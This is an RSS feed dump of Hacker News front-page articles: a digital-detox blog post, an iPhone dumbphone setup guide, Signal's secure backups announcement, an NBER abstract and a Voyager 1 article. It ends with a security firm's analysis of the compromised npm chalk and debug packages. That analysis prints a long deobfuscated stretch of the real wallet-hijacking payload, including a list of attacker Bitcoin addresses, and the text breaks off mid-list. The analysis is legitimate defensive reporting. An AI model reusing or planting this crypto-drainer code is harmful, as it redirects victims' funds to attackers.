<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Hacker News: Front Page</title>
        <link>https://news.ycombinator.com/</link>
        <description>Hacker News RSS</description>
        <lastBuildDate>Mon, 08 Sep 2025 18:42:14 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>github.com/Prabesh01/hnrss-content-extract</generator>
        <language>en</language>
        <atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/frontpage.rss" rel="self" type="application/rss+xml"/>
        <item>
            <title><![CDATA[Escaping the Internet]]></title>
            <link>https://www.ryanckulp.com/escaping-the-internet/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45171361</guid>
            <description><![CDATA[there’s a scene in The Office where Dwight calls the internet a fad. we laugh because he’s wrong and out of touch, but he doesn’tRead More]]></description>
            <content:encoded><![CDATA[
									
there’s a scene in The Office where Dwight calls the internet a fad. we laugh because he’s wrong and out of touch, but he doesn’t have to be.



the most connected people in the world pay good money to “disconnect.” it’s a trend to leave one’s phone in another room while sleeping. but nobody seems to ask themself: if the internet sucks, why not avoid it?



i was born in 1990 and bought my first smart phone 19 years later. so i’ve lived most of my life without the internet in my pocket. i have fond memories of fumbling MapQuest printouts in my ’98 Chevy S10 (extended bed, camper top). setting Friday night plans on Tuesday afternoon was peak living. remember catching up with a friend versus stalking them online?



some may argue it’s worth bifurcating the internet into “digitized content” and “bad ideas by people full of sh*t.” but these days they overlap so much i wonder if that’s a distinction without a difference. and labels aside: do you typically feel better or worse after browsing the internet?



my first child is due in a couple months and it’s difficult to imagine tweeting as a parent. why would i argue with a childless blue haired atheist about Islam’s (in)compatibility with Western values? why would i tolerate The Algorithm showing me prostitutes on my social media feed? have we lost our mind?



so i’m fixing it. but it’s unhelpful to quote The Network State or similar elitist fantasy intellectual porn. i’m not going to buy an island or move to the 3rd world. i’m going to stay where i am, with conscious ignorance of my surroundings. i’m bringing back the 90s.



the plan:




downgrade my X profile to private, later delete



set bills to auto pay (+ hire someone to monitor fraud, overages)



downgrade my phone (currently 24/7 do not disturb, ordered a Minimal Phone)



use Amazon to buy books (vs Google to query words) when i get curious



watch movies > shows to avoid the zeitgeist



cancel my newsletter tool (this post will be my last email broadcast)




everything above should be easy because i don’t listen to podcasts, watch sports, or know anything about brands or celebrities. i don’t get fomo for events or people. i don’t have a permanent phone number. i don’t care about discovering new nutrition tips or coding languages. i prefer suffering. i prefer using my hands. i prefer the real world.



subscribe to my blog via RSS or visit me IRL. i will continue reading email, Slack, and Discord chat messages until i exit ongoing concerns.
								]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[iPhone Dumbphone]]></title>
            <link>https://stopa.io/post/297</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45171200</guid>
            <description><![CDATA[I used Apple Configurator to turn my iPhone into a dumb phone. I can only access the apps and websites I want to use, and it’s feeling great!]]></description>
            <content:encoded><![CDATA[I used Apple Configurator to turn my iPhone into a dumb phone. I can only access the apps and websites I want to use, and it’s feeling great!
Compared to when I started I’m saving about 2 hours of screen time a day. If I kept this up for a month I promised to write a post about this setup. It’s now two months so here’s my post. What follows is a backstory, observations, and a how-to-guide.
To get straight to the how-to-guide, click here.
Motivation
It’s common to rack up 4 hours or more of screen time a day on your phone. Here’s one way to see the cost of that: every 20 years, you lose 5 years of your waking time looking at your phone.
This is what had me dreaming about the 2000s and old Nokia phones. But I couldn’t just go back to Nokia. My iPhone gave me Google Maps, Spotify, Uber and Waymo, Kindle and Audible, ChatGPT and Claude, Whatsapp, Wallet.
There’s real utility to iPhones. If only access to utilities didn’t mean I’d also have access to social media.
I often regretted my time on Twitter and Instagram. It would interrupt my flow states at work and detract from quality time with the people I loved. Even alone time suffered: instead of solitude I found myself checking for notifications. [1]
Failed Attempts
I tried and failed to fix this problem three times. Let me enumerate:
I tried self-control but I found myself outmatched. On the surface the solution feels simple: why not just stop using distracting apps? For me using self-control here was like a hunter-gatherer using a club in open battle with a nuclear society. Social media companies spent centuries of human effort figuring out ways to get me to check my phone. If I wanted to win, I would need to use guerrilla methods.
I tried Screen Time but it was too easy to ignore. Apple comes with Screen Time. You can set limits, but I found them useless. Once a limit runs out all you need to unlock your distracting app is to press a button. Do this a few times and you no longer notice the button.
I tried switching phones, but couldn’t let go of the long-tail of iPhone apps. There are lots of interesting dumb phones out there. There’s some with e-ink screens that are really cool. But they only have a few apps. There was always some app that I missed. Even with recent Android-based dumbphones, there were still apps that were only available on the iPhone (I am looking at you Things 3).
If only I could keep my iPhone, but choose just the apps and the websites that I wanted.
Apple Configurator to the rescue
That’s where I discovered Apple Configurator. Apple Configurator lets organizations deploy specific restrictions onto iPhones. This is what lets Apple Stores restrict the iPhones on display, so you can’t change their wallpaper to something humorous.
Configurator is meant for businesses, but nothing stops us from using it personally. And it’s free too!
The Pros of Apple Configurator
I found three advantages to using Configurator.
The first is that there is real friction to making changes. In order to adjust restrictions, you have to physically connect your iPhone to your laptop and open up a kludgy piece of software. This is cumbersome enough that if you have enough willpower to go through with it, you’ll be level-headed enough to not want too. [2]
The second is that you can actually disable the App Store! This is a marvelous win. Having an App Store in your home screen is like being dieter with a pastry shop in your kitchen. It’s not a good idea. So no more App Store. And combine that with content filters for websites, and you can really lock down your phone. When you are at your weakest, there’s effectively no way to hack around the restrictions.
And the final win, it’s still an iPhone. This means you can make a dumbphone that fits your needs exactly. There are some apps that sound distracting on the surface, that I just needed plain and simple. For example, my startup uses Discord to talk to users; I want to have it. I want the GitHub app. I want Things3 and Waymo. I want to access specific websites. I can set it all up so my phone is exactly the utility I need it to be.
The Cons of Apple Configurator
If you’re getting excited, let me prepare you with two cons.
The first is that you have to factory reset your iPhone. You can only set up Apple Configurator with a completely reset phone. This means the initial setup is annoying and will take you a few hours. But perhaps this a good thing too. If you go through this trouble, you’ll be even more motivated to stick with your choices.
The second is that getting the right setup takes a few weeks, and you may need to rely on others. When you start out you may forget an app or two (or a lot more). For example, I went to my gym the day after I set my restrictions, only to remember that they have a special iPhone to check in. You’ll have lots of little frictions like this. As you do, you’ll improve your configuration so this happens less. It’ll get better but there will still be a long-tail. Maybe you’re at a restaurant and they need you to open a website for example. You may end up having to bug some people around you for their phone. It can be annoying but I haven’t found this to be too troublesome.
Observations so far
So, it’s 2 months in. Here’s my experience so far:
The Good
It feels great. My phone feels like a utility. I think this is the same kind of change in feeling I would have had if I shifted from eating junk food to healthy food. My phone used to have this gravity: like invariably my attention would shift towards it. Now it just feels like a very useful rock.
I found ChatGPT and Claude critically useful. Whenever I need some information, I can just ask my LLM, and it can give me a distraction free summary. It helps the long-tail of weird situations too: for example if someone asks me to take a look at a website, I can ask my LLM to scrape it and summarize the details for me. It’s pretty hard to get distracted this way.
And in the the last 2 months I have not felt the desire to remove the restrictions. This wasn’t the case with any previous setup I tried. I think it’s because the friction feels just right. I feel like I can control exactly how my phone should work; there’s just a day or two delay. The delay keeps me level-headed.
The remaining issues
So far the only real unsolved issue I have are related to “semi-important” apps. Consider email. I still need to have access to email, and I want to have notifications enabled so I don’t miss something truly important. But 90% of the emails I get aren’t important.
I am not sure what the solution is to these kind of apps. Maybe I can find a special mail app, that only shows you important emails. If I had something like this I think I would just be over the moon with this setup. [3]
The Overall
I used to spend about 4 hours a day on my phone. I’m now down to about 2 hours a day. Looking at the stats, it’s 1 hour of reasonably productive apps, mixed with communication apps (my family lives in a different country, so I make long calls). Overall I don’t regret this time.

The How-To Guide
If you want to do this yourself, it’s going to take a 2-hour initial commitment, and about 2 weeks of tweaks to get everything set up just right.
In the first 2 hours, you will factory reset your phone, and set up Apple Configurator. As those two weeks progress, you’ll tweak your restrictions so you have just the apps and the websites you actually need.
Okay, let’s get into those first 2 hours!
1. Factory reset your iPhone
Time to reset your iPhone. Go to Settings → General → Transfer or Reset iPhone → Erase all content and settings.

This is the first, and the scariest step. Do it, and you are on the journey 🫡
2. Install Apple Configurator
Now head on over to the Apple and install Apple Configurator. Open the app and click ‘Get Started’

3. ‘Prepare’ your iPhone
We can then prepare your device for configurator. Connect your iPhone to your laptop. You should see it show up in Configurator. Once you do, Right click and click “Prepare”:

Select “Manual Configuration”, with “Supervise devices” like so:

You can skip “Sign in to Apple School Manager or Apple Business Manager”. Just press Next.

Now enter an “Organization”. Since this is just for yourself, you are an organization of one : ). I use my name:

In “Configure iOS Setup Assistant”, select “Don’t show any of these steps”

Click “Prepare”

Aand you’re ready to go!

Your phone is now ready for Configurator.
4. Set up your iPhone
Before we start adding restrictions, let’s set your phone up. Go through Apple’s setup, and make sure you do not restore your iPhone from an iCloud backup. This will undo the supervision stuff we just did.
Once you set things up, go ahead and install all the apps that you’ll need. As a way to jog your memory, here are the apps that I ended up installing:
## Reading/Learning

- Audible
- Kindle

## Convenience

- Doordash
- Uber
- Lyft
- Waymo
- Turo

## Health

- (Your Gym App)
- Whoop

## Auth

- LastPass
- Authenticator

## Communication

- Messenger
- WhatsApp
- Signal
- Slack
- Discord

## AI

- ChatGPT
- Claude

## Google

- Gmail
- Google Calendar
- Google Maps
- Google Photos

## Dev

- Expo Go
- GitHub
- TestFlight

## Home

- Ring
- (Your Internet Provider)

## Music

- Spotify

## Producitvity

- Things5. Create your ‘Profile’
Now it’s time to set up your restrictions! You’ll create a new Configurator ‘Profile’.
Click ‘File’ → ‘New Profile’.
You’ll make three changes
General
Under ‘General’: For ‘Security’ and ‘Automatically Remove Profile’, set ‘Never’:

Content Filter
Head on over to ‘Content Filter’, and click ‘Configure’. For ‘Filter Type’, select “Specific Websites only”:

Enter some of the sites you want to use. To jog your memory, here are some sites I added:
## Google Auth

- https://accounts.google.com

## Docs

- https://dropbox.com

## Modern databases with real-time sync

- https://instantdb.comRestrictions
‘Restrictions’ are where we will disable the App Store. Click on ‘Restrictions’ → ‘Configure’.
Keep everything as it is, just uncheck ‘Allow Installing Apps’

With that, save your profile. Once we install this profile on your phone…you’re done.
6. Add your profile!
So let’s install this profile to your iPhone.
Right click your phone on Configurator, hit ‘Add’ → ‘Profiles’, pick your profile, and you’re ready to go!

When you load your phone, you should no longer see an App Store!
An on/off switch
After a while you may realize you need to install some new apps. When you want to do that, connect your phone, ‘Right click’ → ‘Remove’ → ‘Profile’

Once you remove your profile, you’re back to a restrictionless world. Make all the changes you need, and then add it back.
Fin
And with that, you have an iPhone dumbphone! I hope it’s as useful for you as it has been for me.
If you follow the instructions and have any issues or changes to make, please send me an email.

Thanks to Ilia Parunashvili for trying the original instructions I wrote out and providing screenshots.
Thanks to Alex Kotliarskyi, Alex Reichert, Daniel Woelfel, Jacky Wang, Nicole Garcia Fischer, for reviewing drafts of this essay.
[1] Let the record show I don’t think these apps are useless. I made friends on Twitter, heck I worked at Facebook for 4 years. I just think these are tools better used in moderation. But it’s hard to use them in moderation on your phone.
[2] And if you already have your laptop handy, there’s an easier fix for your distraction: just use your laptop to check Twitter.
[3] My friend Alex Kotliarskyi mentioned I could try using Google’s App Script to talk to an LLM and filter emails. This could be cool!
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Signal Secure Backups]]></title>
            <link>https://signal.org/blog/introducing-secure-backups/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45170515</guid>
            <description><![CDATA[In the past, if you broke or lost your phone, your Signal message history was gone. This has been a challenge for people whose most important conversations happen on Signal. Think family photos, sweet messages, important documents, or anything else you don’t want to lose forever. This explains wh...]]></description>
            <content:encoded><![CDATA[In the past, if you broke or lost your phone, your Signal message history was gone. This has been a challenge for people whose most important conversations happen on Signal. Think family photos, sweet messages, important documents, or anything else you don’t want to lose forever. This explains why the most common feature request has been backups; a way for people to get Signal messages back even if their phone is lost or damaged.After careful design and development, we are now starting to roll out secure backups, an opt-in feature. This first phase is available in the latest beta release for Android. This will let us further test this feature in a limited setting, before it rolls out to iOS and Desktop in the near future.Here, we’ll outline the basics of secure backups and provide a high-level overview about how they work and how we built a system that allows you to recover your Signal conversations while maintaining the highest bar for privacy and security.Secure Backups 101Secure backups let you save an archive of your Signal conversations in a privacy-preserving form, refreshed every day; giving you the ability to restore your chats even if you lose access to your phone. Signal’s secure backups are opt-in and, of course, end-to-end encrypted. So if you don’t want to create a secure backup archive of your Signal messages and media, you never have to use the feature.1If you do decide to opt in to secure backups, you’ll be able to securely back up all of your text messages2 and the last 45 days’ worth of media3 for free.If you want to back up your media history beyond 45 days4, as well as your message history, we also offer a paid subscription plan for US$1.99 per month.5This is the first time we’ve offered a paid feature. The reason we’re doing this is simple: media requires a lot of storage, and storing and transferring large amounts of data is expensive. As a nonprofit that refuses to collect or sell your data, Signal needs to cover those costs differently than other tech organizations that offer similar products but support themselves by selling ads and monetizing data.Anatomy of Secure Backups: Privacy First, AlwaysAt Signal, our commitment to privacy informs which features we build and the ways that we build them.Using the same zero-knowledge technology that enables Signal groups to work without revealing intimate metadata, backup archives are stored without a direct link to a specific backup payment or Signal user account.At the core of secure backups is a 64-character recovery key that is generated on your device. This key is yours and yours alone; it is never shared with Signal’s servers.6 Your recovery key is the only way to “unlock” your backup when you need to restore access to your messages. Losing it means losing access to your backup permanently, and Signal cannot help you recover it. You can generate a new key if you choose. We recommend storing this key securely (writing it down in a notebook or a secure password manager, for example).These choices are part and parcel of Signal’s guiding mission to collect as close to no data as possible, and to make sure that any information that is required to make Signal robust and usable cannot be tied back to the people who depend on Signal.7 This is why wherever there’s a choice between security and any other objective, we’ve prioritized security.8Enabling Secure BackupsIf you want to opt in to secure backups, you can do so from your Signal Settings menu. For now, only people running the latest beta version of Signal on Android will be able to opt in. But soon, we’ll be rolling this feature out across all platforms.Once you’ve enabled secure backups, your device will automatically create a fresh secure backup archive every day, replacing the previous day’s archive.9 Only you can decrypt your backup archive, which will allow you to restore your message database (excluding view-once messages and messages scheduled to disappear within the next 24 hours). Because your secure backup archive is refreshed daily, anything you deleted in the past 24 hours, or any messages set to disappear are removed from the latest daily secure backup archive, as you intended.Backing up, moving forwardWe’re excited to introduce secure backups, making sure you can retain access to your Signal messages even when your phone is lost or destroyed. But secure backups aren’t the end of the road.The technology that underpins this initial version of secure backups will also serve as the foundation for more secure backup options in the near future. Our future plans include letting you save a secure backup archive to the location of your choosing, alongside features that let you transfer your encrypted message history between Android, iOS, and Desktop devices.Secure backups are available in today’s Android beta release. A full public release, along with iOS and Desktop support, is coming soon.Someone you’re chatting with could choose to back up your conversation even if you haven’t activated the feature. These chats will continue to be protected in ways that we explain in this post, ensuring that your Signal conversations are only accessible to you and the people you are communicating with. ↩The free tier includes 100 MiB of message storage. Messages are compressed and stored in a secure backup archive, and we think 100 MiB will be large enough for even heavy Signal users to back up the text of all of their messages. ↩Media comprises things like photos, videos, GIFs, files, and any attachments. ↩The storage size limit for paid backups is 100 GB. ↩Please note that prices are subject to change in the future. ↩This key is different from your Signal PIN, which serves different purposes. ↩Another example: We have also taken extra steps to protect media by encrypting the already-encrypted files a second time with a key unique to your backup and adding padding to obscure their true size. This prevents malicious actors from comparing encrypted files to identify users who are in the same groups, in the unlikely instance that they gain access to the backup files. ↩For instance, a catastrophic failure could render the most recent daily backup archive unrecoverable until the next backup cycle completes (which should occur within one day). While we believe such data loss is highly unlikely, this approach ensures that your message history remains protected against even the most sophisticated threats while smoothly recovering within 24 hours. ↩Our open-source storage management software is available at https://github.com/signalapp/storage-manager. ↩]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[OpenWrt: A Linux OS targeting embedded devices]]></title>
            <link>https://openwrt.org/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45170087</guid>
            <description><![CDATA[Protected by Anubis From Techaro. Made with ❤️ in 🇨🇦.]]></description>
            <content:encoded><![CDATA[Protected by Anubis From Techaro. Made with ❤️ in 🇨🇦.Mascot design by CELPHASE.This website is running Anubis version 1.22.0-dev.]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Job Mismatch and Early Career Success]]></title>
            <link>https://www.nber.org/papers/w34215</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45169892</guid>
            <description><![CDATA[Founded in 1920, the NBER is a private, non-profit, non-partisan organization dedicated to conducting economic research and to disseminating research findings among academics, public policy makers, and business professionals.]]></description>
            <content:encoded><![CDATA[
        
    Working Paper 34215
    
  

        
    DOI 10.3386/w34215
    
  

        
    Issue Date September 2025

    
  

          
    
How does being over- or underqualified at the beginning of a worker's career affect skill acquisition, retention, and promotion? Despite the importance of mismatch for the labor market, self-selection into jobs has made estimating these effects difficult. We overcome endogeneity concerns in the context of the US Air Force, which allocates new enlistees to over 130 different jobs based, in part, on test scores. Using these test scores, we create simulated job assignments based on factors outside of an individual's control: the available slots in upcoming training programs and the quality of other recruits entering at the same time. These factors create quasi-random variation in job assignment and hence how cognitively demanding an individual's job is relative to their own ability. We find that being overqualified for a job causes higher attrition, both during technical training and afterward when individuals are working in their assigned jobs. It also results in more behavioral problems, worse performance evaluations, and lower scores on general knowledge tests about the military taken by all workers. On the other hand, overqualification results in better performance relative to others in the same job: job-specific test scores rise both during technical training and while on the job, and these individuals are more likely to be promoted. Combined, these patterns suggest that overqualified individuals are less motivated, but still outperform others in their same job. Underqualification results in a polar opposite set of findings, suggesting these individuals are motivated to put forth more effort, but still struggle to compete when judged relative to others. Consistent with differential incentives, individuals who are overqualified are in jobs which are less valuable in terms of outside earnings potential, while the reverse is true for those who are underqualified.

  ]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[After nearly half a century in deep space, every ping from Voyager 1 is a bonus]]></title>
            <link>https://www.theregister.com/2025/09/07/48_years_voyager_1/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45169798</guid>
            <description><![CDATA[: Powered by plutonium, running on pure stubbornness]]></description>
            <content:encoded><![CDATA[
It is almost half a century since Voyager 1 was launched from Cape Canaveral in Florida on a mission to study Jupiter, Saturn, and the atmosphere of Titan. It continues to send data back to Earth.
Although engineers reckon that the aging spacecraft might survive well into the 2030s before eventually passing out of range of the Deep Space Network, the spacecraft's cosmic ray subsystem was switched off in 2025. More of the probe's instruments are earmarked for termination as engineers eke out Voyager's power supply for a few more years.
On September 5, 1977, the power situation was a good deal healthier when the mission got underway. Launched just over two weeks after Voyager 2, Voyager 1 was scheduled to make flybys of Jupiter and Saturn. It skipped a visit to Pluto in favor of a closer look at the Saturnian moon Titan, which had an intriguing atmosphere.

    

The launch was the final one for the Titan IIIE rocket and was marred slightly by an earlier-than-expected second stage engine cutoff. NASA averted disaster by using a longer burn of the Centaur stage to compensate, and Voyager 1's mission to Jupiter, Saturn, and beyond began.

        


        

Voyager 1's journey to the launchpad began with the "Grand Tour" concept of the 1960s, in which Gary Flandro of the Jet Propulsion Laboratory (JPL) noted an alignment of Jupiter, Saturn, Uranus, and Neptune would occur in the 1970s, allowing a probe to swing by all the planets by using gravity assists.
Two missions were planned – one to be launched in 1977 to Jupiter, Saturn, and Pluto, and another in 1979 to visit Jupiter, Uranus, and Neptune. The concept gained support, but with costs spiraling and NASA also trying to develop the Space Shuttle, it was scaled back to visit two planets with two probes, derived from the Mariner program.

        

Indeed, the mission was known as the Mariner Jupiter-Saturn project until shortly before the 1977 launch, when the name "Voyager" was selected.
One of the Voyager scientists, Dr Garry Hunt, told The Register that the idea of doing a Jupiter-Saturn-Uranus-Neptune mission had never really gone away, and engineers fueled the spacecraft fully expecting to be granted an extension.
"We knew that if you filled up to brimming point the spacecraft with all the fuel it ever needed, it'd be OK," recalled Hunt. "We did. But we never told anybody."


NASA to silence Voyager's social media accounts

Odd homage to '2001: A Space Odyssey' sees 'Blue Danube' waltz beamed at Voyager 1

NASA keeps ancient Voyager 1 spacecraft alive with Hail Mary thruster fix

More Voyager instruments shut down to eke out power supplies

Voyager 1 could have performed the same Grand Tour as Voyager 2, and would have if disaster had befallen the latter at or soon after launch. However, it was Voyager 2 that swung past Uranus and Neptune, while Voyager 1 took a trip past Titan before finally heading away from the planets. It used its cameras to take one last set of images – the famous "Solar System Family Portrait," comprising six of the solar system's eight planets and, of course, the "Pale Blue Dot" image.
Voyager took the images on February 14, 1990. "That was always our farewell thing," said Hunt. "That was our Valentine's present for 1990."

        

Farewell? Not quite. Voyager 1 continues to send data back to Earth, 48 years after its launch. Yes, there have been issues – a recent computer problem onboard the probe required some impressive engineering on the ground to work around a failed component – but the mission continues, with every passing year a bonus. ®                                
                    ]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[NPM debug and chalk packages compromised]]></title>
            <link>https://www.aikido.dev/blog/npm-debug-and-chalk-packages-compromised</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45169657</guid>
            <description><![CDATA[The popular packages debug and chalk on npm have been compromised with malicious code]]></description>
            <content:encoded><![CDATA[Published on:September 8, 2025Last updated on:September 8, 2025Starting at September 8th, 13:16 UTC, our Aikido intel feed alerted us to a series packages being pushed to npm, which appeared to contains malicious code. These were 18 very popular packages,backslash (0.26m downloads per week)chalk-template (3.9m downloads per week)supports-hyperlinks (19.2m downloads per week)has-ansi (12.1m downloads per week)simple-swizzle (26.26m downloads per week)color-string (27.48m downloads per week)error-ex (47.17m downloads per week)color-name (191.71m downloads per week)is-arrayish (73.8m downloads per week)slice-ansi (59.8m downloads per week)color-convert (193.5m downloads per week)wrap-ansi (197.99m downloads per week)ansi-regex (243.64m downloads per week)supports-color (287.1m downloads per week)strip-ansi (261.17m downloads per week)chalk (299.99m downloads per week)debug (357.6m downloads per week)ansi-styles (371.41m downloads per week)All together, these packages have more than 2 billion downloads per week. The packages were updated to contain a piece of code that would be executed on the client of a website, which silently intercepts crypto and web3 activity in the browser, manipulates wallet interactions, and rewrites payment destinations so that funds and approvals are redirected to attacker-controlled accounts without any obvious signs to the user.To avoid being compromised by packages like this, check out Aikido safe-chain!What happened?The above packages all started having new versions released, an example here being is-arrayish:We can see that the index.js file is modified, and contains obfuscated code:‍After applying a bit of deobfuscation to it, we get a fairly complex piece of code still:var neth = 0;
var rund = 0;
var loval = 0;
async function checkethereumw() {
  try {
    const _0x124ed3 = await window.ethereum.request({
      'method': "eth_accounts"
    });
    if (_0x124ed3.length > 0) {
      runmask();
      if (rund != 1) {
        rund = 1;
        neth = 1;
        newdlocal();
      }
    } else if (rund != 1) {
      rund = 1;
      newdlocal();
    }
  } catch (_0x53a897) {
    if (rund != 1) {
      rund = 1;
      newdlocal();
    }
  }
}
if (typeof window != "undefined" && typeof window.ethereum != "undefined") {
  checkethereumw();
} else if (rund != 1) {
  rund = 1;
  newdlocal();
}
function newdlocal() {
  const _0xba16ef = {
    'zprkq': function (_0x23e86b, _0x5b593c) {
      return _0x23e86b + _0x5b593c;
    },
    'iJAYR': function (_0xc91263, _0x20ad3a) {
      return _0xc91263 <= _0x20ad3a;
    },
    'nqxhl': function (_0x31d70d, _0x545869) {
      return _0x31d70d <= _0x545869;
    },
    'myaXd': function (_0xd587f7, _0x356cb8) {
      return _0xd587f7 === _0x356cb8;
    },
    'IptyQ': function (_0x52d73c, _0x1701dc) {
      return _0x52d73c - _0x1701dc;
    },
    'QCTBQ': function (_0x3b97a6, _0x5cd5e9) {
      return _0x3b97a6 - _0x5cd5e9;
    },
    'avmeH': function (_0x370f68, _0x51151b) {
      return _0x370f68 - _0x51151b;
    },
    'TwyPu': function (_0x43ced5, _0x54174b) {
      return _0x43ced5 + _0x54174b;
    },
    'arczN': function (_0x2b592d, _0x5339ba) {
      return _0x2b592d - _0x5339ba;
    },
    'yMgZR': function (_0xb3fb8a, _0x24a479) {
      return _0xb3fb8a - _0x24a479;
    },
    'qEVKr': function (_0x4a3a26, _0x16853b) {
      return _0x4a3a26 - _0x16853b;
    },
    'vGpiX': function (_0x9c66ab, _0x1a38b9, _0x1d740b) {
      return _0x9c66ab(_0x1a38b9, _0x1d740b);
    },
    'eGWOd': function (_0x3630fa, _0x17694b) {
      return _0x3630fa < _0x17694b;
    },
    'tfqRA': function (_0x562199, ..._0x1555b8) {
      return _0x562199(..._0x1555b8);
    },
    'viQtk': "Content-Type",
    'DSXar': "application/json",
    'mDaWt': function (_0x2116fd, _0x26f622) {
      return _0x2116fd(_0x26f622);
    },
    'FXtyf': function (_0x4f1346, _0x53343b) {
      return _0x4f1346 === _0x53343b;
    },
    'FYAPh': "string",
    'UmfJm': function (_0x301d56, _0x29139b) {
      return _0x301d56 === _0x29139b;
    },
    'LmXxC': function (_0x467473, _0x5d7154) {
      return _0x467473(_0x5d7154);
    },
    'yVHgJ': "responseText",
    'aXpuC': "response",
    'yArwb': "object",
    'MJKcn': function (_0x5561bf, _0x1792e6) {
      return _0x5561bf !== _0x1792e6;
    },
    'gHrJP': function (_0xe2c323, _0x4c49d0) {
      return _0xe2c323 === _0x4c49d0;
    },
    'OiGzk': "1H13VnQJKtT4HjD5ZFKaaiZEetMbG7nDHx",
    'EAhsy': "1Li1CRPwjovnGHGPTtcKzy75j37K6n97Rd",
    'lLQUz': "1Dk12ey2hKWJctU3V8Akc1oZPo1ndjbnjP",
    'ibPEr': "1NBvJqc1GdSb5uuX8vT7sysxtT4LB8GnuY",
    'cGpnb': "1Mtv6GsFsbno9XgSGuG6jRXyBYv2tgVhMj",
    'wAGlT': "1BBAQm4DL78JtRdJGEfzDBT2PBkGyvzf4N",
    'Hauzr': "1KkovSeka94yC5K4fDbfbvZeTFoorPggKW",
    'nJNgC': "18CPyFLMdncoYccmsZPnJ5T1hxFjh6aaiV",
    'EHOlV': "1BijzJvYU2GaBCYHa8Hf3PnJh6mjEd92UP",
    'cOZYT': "1Bjvx6WXt9iFB5XKAVsU3TgktgeNbzpn5N",
    'cIySf': "19fUECa9aZCQxcLeo8FZu8kh5kVWheVrg8",
    'rrGeC': "1DZEep7GsnmBVkbZR3ogeBQqwngo6x4XyR",
    'geUVS': "1GX1FWYttd65J26JULr9HLr98K7VVUE38w",
    'TZdxq': "14mzwvmF2mUd6ww1gtanQm8Bxv3ZWmxDiC",
    'JgcFw': "1EYHCtXyKMMhUiJxXJH4arfpErNto5j87k",
    'gKbQq': "19D1QXVQCoCLUHUrzQ4rTumqs9jBcvXiRg",
    'KObJu': "16mKiSoZNTDaYLBQ5LkunK6neZFVV14b7X",
    'vYGdx': "18x8S4yhFmmLUpZUZa3oSRbAeg8cpECpne",
    'gtZOV': "1EkdNoZJuXTqBeaFVzGwp3zHuRURJFvCV8",
    'ApfqP': "13oBVyPUrwbmTAbwxVDMT9i6aVUgm5AnKM",
    'hgmsX': "1DwsWaXLdsn4pnoMtbsmzbH7rTj5jNH6qS",
    'TNgNB': "13wuEH28SjgBatNppqgoUMTWwuuBi9e4tJ",
    'UhmAX': "154jc6v7YwozhFMppkgSg3BdgpaFPtCqYn",
    'vXyJx': "1AP8zLJE6nmNdkfrf1piRqTjpasw7vk5rb",
    'HmJHn': "19F8YKkU7z5ZDAypxQ458iRqH2ctGJFVCn",
    'UlhFZ': "17J3wL1SapdZpT2ZVX72Jm5oMSXUgzSwKS",
    'VShzV': "16z8D7y3fbJsWFs3U8RvBF3A8HLycCW5fH",
    'IzSNV': "1PYtCvLCmnGDNSVK2gFE37FNSf69W2wKjP",
    'hiXcO': "143wdqy6wgY3ez8Nm19AqyYh25AZHz3FUp",
    'gwsfo': "1JuYymZbeoDeH5q65KZVG3nBhYoTK9YXjm",
    'XjToi': "1PNM2L1bpJQWipuAhNuB7BZbaFLB3LCuju",
    'qzLJJ': "19onjpqdUsssaFKJjwuAQGi2eS41vE19oi",
    'NrttU': "1JQ15RHehtdnLAzMcVT9kU8qq868xFEUsS",
    'mLamd': "1LVpMCURyEUdE8VfsGqhMvUYVrLzbkqYwf",
    'ENfnx': "1KMcDbd2wecP4Acoz9PiZXsBrJXHbyPyG6",
    'teGcp': "1DZiXKhBFiKa1f6PTGCNMKSU1xoW3Edb7Z",
    'lkQtS': "174bEk62kr8dNgiduwHgVzeLgLQ38foEgZ",
    'nVfSu': "17cvmxcjTPSBsF1Wi2HfcGXnpLBSzbAs6p",
    'XdmQg': "1NoYvnedUqNshKPZvSayfk8YTQYvoB2wBc",
    'hTAuL': "13694eCkAtBRkip8XdPQ8ga99KEzyRnU6a",
    'hmVdI': "bc1qms4f8ys8c4z47h0q29nnmyekc9r74u5ypqw6wm",
    'SvssU': "bc1qznntn2q7df8ltvx842upkd9uj4atwxpk0whxh9",
    'zXlNj': "bc1q4rllc9q0mxs827u6vts2wjvvmel0577tdsvltx",
    'OOAQz': "bc1qj8zru33ngjxmugs4sxjupvd9cyh84ja0wjx9c4",
    'TDfnH': "bc1qc972tp3hthdcufsp9ww38yyer390sdc9cvj8ar",
    'UrAmA': "bc1qw0z864re8yvrjqmcw5fs6ysndta2avams0c6nh",
    'ELPqV': "bc1qzdd8c7g2g9mnnxy635ndntem2827ycxxyn3v4h",
    'xlnbk': "bc1qaavgpwm98n0vtaeua539gfzgxlygs8jpsa0mmt",
    'aApMn': "bc1qrdlkyhcrx4n2ksfjfh78xnqrefvsr34nf2u0sx",
    'Pvsjl': "bc1q9ytsyre66yz56x3gufhqks7gqd8sa8uk4tv5fh",
    'fmvYL': "bc1qfrvsj2dkey2dg8ana0knczzplcqr7cgs9s52vq",
    'fXywx': "bc1qg7lkw04hg5yggh28ma0zvtkeg95k0yefqmvv2f",
    'RRxbR': "bc1qmeplum3jy2vrlyzw4vhrcgeama35tr9kw8yfrn",
    'VrdPL': "bc1qamqx0h8rxfcs4l56egrpau4ryqu4r642ttmxq4",
    'qSKMT': "bc1qsaxgtck26mgecgfvp9ml4y5ljyl8ylpdglqz30",
    'mbTQq': "bc1qsz90ulta8dx5k8xzzjqruzahav2vxchtk2l8v7",
